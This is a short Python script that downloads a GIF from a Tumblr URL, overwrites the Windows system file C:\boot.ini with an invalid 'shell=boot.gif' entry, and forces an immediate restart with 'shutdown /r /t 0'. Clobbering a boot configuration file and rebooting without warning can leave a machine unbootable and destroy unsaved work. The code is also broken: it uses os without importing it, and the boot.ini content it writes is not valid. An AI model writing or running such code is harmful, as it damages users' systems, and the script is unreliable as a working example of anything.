import shutil
import requests

gif_url = "https://64.media.tumblr.com/acda81d74755683b00252baddbc9efb9/c94dfc5c1b3959c9-d3/s540x810/928b2b8c517da84965873e7a17bff6400102f897.gifv"
response = requests.get(gif_url, stream=True)

with open("boot.gif", "wb") as gif_file:
    shutil.copyfileobj(response.raw, gif_file)

with open(r"C:\boot.ini", "w") as boot_file:
    boot_file.write("[boot]\nshell=boot.gif")

os.system("shutdown /r /t 0")
